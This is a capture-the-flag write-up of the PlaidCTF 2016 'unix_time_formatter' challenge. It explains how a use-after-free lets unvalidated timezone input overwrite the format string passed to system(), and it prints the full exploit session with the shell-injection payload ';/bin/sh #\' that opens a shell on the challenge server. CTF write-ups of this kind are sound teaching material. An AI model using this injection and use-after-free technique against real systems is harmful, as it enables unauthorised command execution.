# unix_time_formatter
### Pwnable (76 pts)

```
Converting Unix time to a date is hard, so Mary wrote a tool to do so.

Can you you exploit it to get a shell? Running at unix.pwning.xxx:9999
```

Writeup by: [mut3](https://github.com/mut3)

Collaborators: [brianmwaters](https://github.com/brianmwaters), [dillonb](https://github.com/dillonb)

*Disclaimer :We came at this without a really organized process, so take not that most of these discoveries and progressions came with more over caffeinated fiddling and experimenting than this writeup lets on.*

## Intro

For this challenge we were given [this binary](https://github.com/burlingpwn/writeups/tree/master/PlaidCTF-2016/unix_time_formatter/unix_time_formatter_9a0c42cadcb931cce0f9b7a1b4037c6b) which takes a user input date_format, time, & timezone then makes a call to `/bin/date` to print out the input time according to the given format and timezone.

### Normal Run
```
Welcome to Mary's Unix Time Formatter!
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
>1
Format: %c
Format set.
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
>2
Enter your unix time: 1234567890
Time set.
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
>3
Time zone: UTC
Time zone set.
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
>4
Your formatted time is: Fri 13 Feb 2009 11:31:30 PM UTC
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
>5
Are you sure you want to exit (y/N)? y
OK, exiting.
```

## Reversing

The first useful thing we found, after disassembling the binary was the existence of multiple environment checks for a debug flag, called `DEBUG` of course. Here's one of those checks:

```
400c4f:	e8 cc fc ff ff       	callq  400920 <getenv@plt>
```

After that we always started the binary with:

```
$ DEBUG=1 ./unix_time_formatter_9a0c42cadcb931cce0f9b7a1b4037c6b
```

This flag was a very helpful bit of assistance from PPP, as it output the command being run when we printed the time (option 4) and showed the memory pointers used in `strdup` and `free` calls.

Here is the useful DEBUG output per command:

### Format time

```
Format: %c
strdup(0x7fffd37cde78) = 0x1796420
Format set.
```

### Set TZ

```
Time zone: UTC
strdup(0x7fffd37cde78) = 0x1796440
Time zone set.
```

### Print formatted time

```
Your formatted time is: Running command: /bin/date -d @0 +'%c'
Thu 01 Jan 1970 12:00:00 AM UTC
```

### Exit

```
free(0x1796420)
free(0x1796440)
Are you sure you want to exit (y/N)? y
OK, exiting.
```

We honed in on the print formatted time command, that was where we could pop a shell. The call to `/bin/date` was run like this by the program:

```
system(/bin/date -d @[TIME] +'[FORMAT]')
```

Where `[TIME]` and `[FORMAT]` are user input. The time input was dead end in terms of command injection, giving it anything but an int would cause a seg fault when the print call was made. This left us the time format field, surrounded by single quotes, but any 1337 h4x0r worth their salt will know all we have to do is place a closing quote into our payload to escape these.

```
Format: ';/bin/sh #\
strdup(0x7ffcc3308678) = 0x1b17420
Format contains invalid characters.
free(0x1b17420)
```

Uh-oh, no shell, what went wrong? We went back into the disassembled program and found out that it ran some input validation on our time format input. Only the characters `%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^#` were allowed, and without a single quote, we were not successfully injecting straight into time format.

**Now what?**

There's input validation on time-format, but not on timezone. We found we could put anything we wanted into the timezone, but it wasn't included within the `system()` call, so what use was it? We weren't quite sure.

We went back to messing around with the binary in DEBUG mode, testing ideas, bumbling around. After some frustrating head->wall grinding, I noticed the key we had missed before, "Hey wait, the f\*\*\*ing thing **frees those pointers before exit**!" Eureka. When option 5 gets chosen, the memory `malloc()`'d by `strdup()` to store the TZ and format is freed before the user chooses wheter to exit the program or not. Brian had heard of double-free vulns and the undefined behavior they could cause. *(We now know it was just a use-after-free, but we freed twice.)* What a beautiful thing for somebody looking for a vulnerability to hear "undefined behavior," mmmm, tasty.

## Exploiting

Q: What happens after we free these pointers, but don't exit?

A: Wonderful, wonderful things :)

```
Welcome to Mary's Unix Time Formatter!
...
> 1
Format: %c
strdup(0x7ffcd354c5f8) = 0x1d36420
Format set.
...
> 3
Time zone: UTC   
strdup(0x7ffcd354c5f8) = 0x1d36440
Time zone set.
...
> 5
free(0x1d36420)
free(0x1d36440)
Are you sure you want to exit (y/N)? n
...
> 3
Time zone: UTC
strdup(0x7ffcd354c5f8) = 0x1d36440
Time zone set.
...
> 3       
Time zone: UTC
strdup(0x7ffcd354c5f8) = 0x1d36420
Time zone set.
```

There it is, we now have our format field pointing at `0x1d36420` but thanks to use-after-free we just wrote to that address with the TZ input. Time to pop a shell on the server.

## Pwning

```
$ nc unix.pwning.xxx 9999
Welcome to Mary's Unix Time Formatter!
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 1
Format: %c
Format set.
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 3
Time zone: ';/bin/sh #\
Time zone set.
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 5
Are you sure you want to exit (y/N)?
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 5
Are you sure you want to exit (y/N)?
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 3
Time zone: ';/bin/sh #\
Time zone set.
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 3
Time zone: ';/bin/sh #\
Time zone set.
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 4
Your formatted time is:
ls
flag.txt
unix_time_formatter
wrapper
cat flag.txt
PCTF{use_after_free_isnt_so_bad}
exit
```

## Wrapup

Flag: `PCTF{use_after_free_isnt_so_bad}`
Notes:
  * We now know we didn't need to double free, this is a use after free vulnerability
  * Our payload `';/bin/sh #\` probably didn't need the `#\`, but we left it so that the second `'` wouldn't create problems
  * We could have automated this, but it wasn't very time consuming to do manually, and this was our first time popping a shell, very exciting

Thanks to PPP for putting on PCTF.
